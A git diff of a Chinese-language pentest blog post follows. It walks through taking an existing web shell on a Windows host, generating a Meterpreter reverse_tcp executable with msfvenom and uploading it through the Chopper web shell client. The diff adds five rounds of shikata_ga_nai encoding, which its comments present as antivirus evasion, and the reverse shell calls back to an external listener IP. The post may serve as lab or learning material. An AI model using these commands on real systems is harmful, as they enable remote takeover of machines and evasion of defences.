@@ -9,8 +9,8 @@ topics = ["Pentest"]
 +++
 
 ### 0x00 前提
-获得了一个shell：```http://10.11.11.20/a.php```  
-外网安装msf的主机：114.115.123.123
+虚拟机有一个shell：```http://10.11.11.20/a.php```，物理机IP是211.222.222.72   
+外网安装msf的主机：外网IP是114.115.123.123，内网IP是192.168.0.195
 
 ### 0x01 查看主机基本信息
 菜刀连接shell，终端执行systeminfo
@@ -63,11 +63,25 @@ Windows 目录:     C:\Windows
 ### 0x02 弹出会话到Metasploit
 生成payload，然后用菜刀上传到目标服务器
 ```bash
-$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=114.115.183.86 LPORT=8888 --platform windows -f exe -o 86.exe   
-No encoder or badchars specified, outputting raw payload
-Payload size: 341 bytes
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=114.115.123.123 LPORT=8888 -a x86 -e x86/shikata_ga_nai -i 5 --platform windows -f exe -o 86.exe
+Found 1 compatible encoders
+Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 360 (iteration=0)
+x86/shikata_ga_nai succeeded with size 387 (iteration=1)
+x86/shikata_ga_nai succeeded with size 414 (iteration=2)
+x86/shikata_ga_nai succeeded with size 441 (iteration=3)
+x86/shikata_ga_nai succeeded with size 468 (iteration=4)
+x86/shikata_ga_nai chosen with final size 468
+Payload size: 468 bytes
 Final size of exe file: 73802 bytes
 Saved as: 86.exe
+
+# -p 指定payload(用msfvenom -l payloads可查看所有payload)
+# -a 指定目标指令集架构
+# -e 指定用什么编码器编码(多次编码变幻可以免杀，用msfvenom -l encoders可查看编码类型)
+# -i 指定编码迭代的次数
+# --platform 执行目标的平台
+# -f 指定输出格式，可用msfvenom --help-formats查看
 ```
 msf监听，等待payload执行
 ```
